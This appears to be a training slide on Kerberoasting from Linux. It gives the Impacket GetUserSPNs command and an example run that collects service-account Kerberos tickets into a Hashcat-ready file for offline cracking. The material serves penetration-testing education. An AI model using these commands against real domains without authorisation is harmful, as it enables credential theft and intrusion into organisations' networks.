Identifying Kerberoastable SPNs (Linux)

Leveraging GetUserSPNs.py from the Impacket toolkit for reconnaissance.

Impacket Command
impacket-GetUserSPNs -dc-ip <DC_IP> -request <domain>/<username>:<password> -outputfile spns.txt
  • •Queries the Domain Controller for registered SPNs.
  • •Requests service tickets for identified SPNs.
  • •Saves tickets in a format suitable for offline cracking (e.g., Hashcat).
  • •Requires a legitimate domain user's credentials to initiate the request.
Key Parameter

The -request flag is crucial as it tells the script to request the TGS-REP tickets.

Example Execution
impacket-GetUserSPNs -dc-ip 192.168.1.100 -request corp.local/john.doe:Password123! -outputfile spns.txt
Output Format

The spns.txt file will contain the collected Kerberos tickets in a Hashcat-compatible format (mode 13100).

Key Takeaway

GetUserSPNs.py streamlines the collection of Kerberoastable hashes from Linux, preparing them for offline cracking.
